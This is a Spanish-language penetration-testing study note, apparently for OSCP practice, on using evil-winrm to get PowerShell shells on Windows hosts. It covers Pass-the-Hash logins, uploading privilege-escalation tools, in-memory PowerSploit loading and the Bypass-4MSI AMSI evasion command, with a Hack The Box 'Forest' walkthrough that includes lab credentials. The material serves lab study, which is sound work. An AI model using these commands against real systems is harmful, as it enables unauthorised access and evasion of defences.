# 🧰 evil-winrm — Shell remota por WinRM

> Cliente de **WinRM** (Windows Remote Management), el "SSH de Windows". Habla por los
> puertos **5985** (HTTP) / **5986** (HTTPS) con el servicio WinRM del objetivo. Es mi shell
> interactiva preferida en AD cuando el usuario pertenece al grupo **Remote Management Users**.
> Relacionado: [[netexec]] · [[impacket]] · [[asrep-roasting]] · [[acl-abuse]] · [[enumeracion-ad-sin-credenciales]]

---

## Idea central
WinRM es gestión remota legítima de Windows (como SSH en Linux). Si tengo credenciales de un
usuario que está en **Remote Management Users**, `evil-winrm` me da una **consola PowerShell
interactiva** en la máquina. No es un exploit: es usar un servicio legítimo con credenciales
válidas → **muy exam-friendly** (manual, sin Metasploit, poco ruido).

## ¿Puedo usarlo? → compruébalo antes con netexec
No pierdas tiempo si el user no tiene WinRM. Primero ([[netexec]]):
```bash
nxc winrm 10.129.82.212 -u svc-alfresco -p 's3rvice'
# [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)   ← (Pwn3d!) = tengo WinRM → adelante
# sin (Pwn3d!)  → el user NO está en Remote Management Users, olvídalo
```

## Sintaxis base
```bash
evil-winrm -i <IP> -u <usuario> -p <password>
evil-winrm -i 10.129.82.212 -u svc-alfresco -p 's3rvice'
```
- `-i` = IP objetivo · `-u` usuario · `-p` contraseña.
- Entras a un prompt `*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>` = shell PowerShell.

## Pass-the-Hash (sin contraseña, solo el hash NTLM)
El porqué: si he hecho secretsdump/DCSync, tengo el **hash NT**, no la pass en claro. WinRM
acepta el hash directamente (NTLM auth) → no necesito crackear nada:
```bash
evil-winrm -i 10.129.82.212 -u administrator -H <hash_NT>
#                                            └─ -H en vez de -p
```
Esto es **Pass-the-Hash** por WinRM. (Nota pendiente propia: `pass-the-hash`.)

## Conexión por HTTPS (5986) y Kerberos
```bash
evil-winrm -i <IP> -u <u> -p <p> -S           # -S = SSL/TLS (puerto 5986)
evil-winrm -i <IP> -u <u> -r <REALM>          # auth Kerberos con ticket (KRB5CCNAME exportado)
```

---

## 🎁 Lo que lo hace mejor que una shell pelada

### Subir y bajar archivos (integrado, sin montar nada)
```powershell
upload /home/kali/winPEAS.exe                 # Kali → víctima (al dir actual)
upload /ruta/local.exe  C:\Windows\Temp\x.exe # con destino explícito
download C:\Users\Administrator\Desktop\root.txt   # víctima → Kali
```
El porqué: en la víctima no tengo que pelearme con `certutil`/SMB para mover ficheros. Clave
para subir **winPEAS**, **PrintSpoofer/GodPotato**, **SharpHound.exe**, etc.

### Cargar scripts de PowerShell en memoria (`-s`)
```bash
evil-winrm -i <IP> -u <u> -p <p> -s /usr/share/windows-resources/powersploit/
```
Ya dentro, teclas el nombre del `.ps1` (p.ej. `PowerView.ps1`) y lo carga **en memoria** (sin
tocar disco). Luego usas sus funciones (`Get-NetUser`, etc.). `-e` hace lo mismo para binarios.

### Bypass de AMSI (cuando Defender bloquea tus scripts)
Dentro de la sesión:
```powershell
Bypass-4MSI          # desactiva AMSI en esta sesión → deja cargar PowerView/etc.
```

### Menú de ayuda dentro de la sesión
```powershell
menu                 # lista los comandos extra de evil-winrm (upload, download, services...)
```

---

## 🧠 Mental model OSCP
1. Consigo credenciales (crack de [[asrep-roasting]]/[[kerberoasting]], o hash por DCSync).
2. `nxc winrm ... ` → ¿`(Pwn3d!)`? Si sí → `evil-winrm`.
3. Dentro: `whoami /all` y `whoami /groups` → ¿en qué grupos estoy? (ruta a privesc).
4. `upload winPEAS.exe` → enumero privesc local.
5. Si consigo hash de admin → `evil-winrm -u administrator -H <hash>` (Pass-the-Hash).

## 🩹 Errores típicos
| Mensaje | Qué significa | Qué hago |
|---|---|---|
| `WinRMAuthorizationError` / 401 | el user no está en **Remote Management Users** | otro vector (psexec/wmiexec de [[impacket]]) o escalo primero |
| Conexión rechazada al 5985 | WinRM no está escuchando | ¿es realmente WinRM? mira nmap; prueba 5986 con `-S` |
| `Bypass-4MSI` falla | AMSI/Defender endurecido | subir el script ofuscado o usar otra técnica |

## 🔑 Checklist
- [ ] Antes de evil-winrm: `nxc winrm` → confirmar `(Pwn3d!)`
- [ ] `-p` con pass, `-H` con hash (Pass-the-Hash)
- [ ] Nada más entrar: `whoami /all` + `whoami /groups`
- [ ] `upload`/`download` integrados → mover winPEAS y flags
- [ ] `Bypass-4MSI` si Defender molesta · `-s` para cargar PowerView
- [ ] Manual, sin Metasploit → exam-friendly

---

## Caso real — Forest (HTB)
Crackeado el AS-REP de `svc-alfresco` ([[asrep-roasting]]) → la pass funcionaba por WinRM
(`nxc winrm` dio `(Pwn3d!)`). `evil-winrm -i <IP> -u svc-alfresco -p 's3rvice'` → shell →
`user.txt`. Desde ahí, enumeración con BloodHound para la ruta a Domain Admin ([[acl-abuse]]).
